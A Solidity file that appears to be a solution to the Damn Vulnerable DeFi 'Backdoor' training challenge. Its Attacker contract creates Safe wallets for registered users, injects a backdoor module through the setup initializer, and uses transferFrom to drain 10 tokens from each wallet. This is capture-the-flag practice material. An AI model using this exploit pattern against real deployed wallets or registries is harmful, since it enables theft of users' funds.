
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {IProxyCreationCallback} from "safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
import {Backdoor} from "./Backdoor.sol";

contract Attacker {


    constructor(address walletFactory, address singletonCopy, 
    address walletRegistry, address token, address recovery, address[] memory users) {
        Backdoor backdoor = new Backdoor(token, address(this));

        for (uint256 i = 0; i < users.length; i++) {
            
            bytes memory data = abi.encodeWithSignature(
                "attack()"
            );
            // address[] calldata _owners,
            // uint256 _threshold,
            // address to,
            // bytes calldata data,
            // address fallbackHandler,
            // address paymentToken,
            // uint256 payment,
            // address payable paymentReceiver
            address[] memory owners = new address[](1);
            owners[0] = users[i];
            bytes memory initializer = abi.encodeWithSelector(
                Safe.setup.selector,
                owners,
                1,
                address(backdoor),
                data,
                address(0),
                address(0),
                0,
                payable(0)
            );

            SafeProxy proxy = SafeProxyFactory(walletFactory).createProxyWithCallback(
                address(singletonCopy), // locked
                initializer,
                0,
                (IProxyCreationCallback)(walletRegistry) // locked
            );
            (DamnValuableToken)(token).transferFrom(address(proxy), recovery, 10e18);
        }
    }
}